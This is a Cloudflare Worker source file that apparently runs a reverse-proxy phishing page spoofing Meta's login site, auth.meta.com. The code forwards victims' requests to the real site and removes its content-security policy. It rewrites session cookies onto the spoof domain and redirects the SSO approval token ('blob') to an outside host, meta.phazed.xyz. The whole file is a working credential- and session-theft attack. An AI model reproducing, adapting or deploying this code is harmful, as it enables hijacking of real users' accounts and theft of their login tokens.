import { AutoRouter } from 'itty-router';

const app = AutoRouter();

app.get('*', async ( req ) => {
	let proxyHeaders: any = {};
	let url = new URL(req.url);

	req.headers.forEach((val, key) => {
		proxyHeaders[key] = val;
	})

	proxyHeaders["host"] = 'auth.meta.com';

	let proxy = await fetch('https://auth.meta.com' + url.pathname + url.search, { method: req.method, headers: proxyHeaders });

	let body = await proxy.text();
	body = body.replaceAll('https://', "https://cors-proxy.phaze.workers.dev/?url=https://")

	let proxyResHeaders: any = {};

	proxy.headers.forEach((val, key) => {
		proxyResHeaders[key] = val;
	})

	proxyResHeaders["content-security-policy"] = "";

	return new Response(body, { status: proxy.status, headers: proxyResHeaders });
})

app.post("*", async ( req ) => {
	let proxyHeaders: any = {};
	let url = new URL(req.url);

	req.headers.forEach((val, key) => {
		proxyHeaders[key] = val;
	})

	proxyHeaders["host"] = 'auth.meta.com';
	proxyHeaders["origin"] = 'https://auth.meta.com';
	proxyHeaders["referer"] = proxyHeaders["referer"].replace("https://meta-login-spoof.phaze.workers.dev", 'https://auth.meta.com');

	let proxy = await fetch('https://auth.meta.com' + url.pathname + url.search, { method: req.method, headers: proxyHeaders, body: await req.text() });

	let body = await proxy.text();
	body = body.replaceAll('https://', "https://cors-proxy.phaze.workers.dev/?url=https://")

	let proxyResHeaders: any = {};

	proxy.headers.forEach((val, key) => {
		proxyResHeaders[key] = val;
	})

	proxyResHeaders["content-security-policy"] = "";

	if(proxyResHeaders["set-cookie"])
		proxyResHeaders["set-cookie"] = proxyResHeaders["set-cookie"].replaceAll(".auth.meta.com", "meta-login-spoof.phaze.workers.dev");

	if(url.pathname === '/api/native_sso/approved/'){
		let val = JSON.parse(body.replace("for (;;);", ""));

		let url = new URL(val.payload.uri);
    let blob = url.searchParams.get("blob")!;

		val.payload.uri = "https://meta.phazed.xyz/?blob=" + blob;
		body = "for (;;);" + JSON.stringify(val);
	}

	return new Response(body, { status: proxy.status, headers: proxyResHeaders });
})

export default {
	async fetch(request, env, ctx): Promise<Response> {
		return await app.fetch(request, env, ctx);
	},
} satisfies ExportedHandler<Env>;
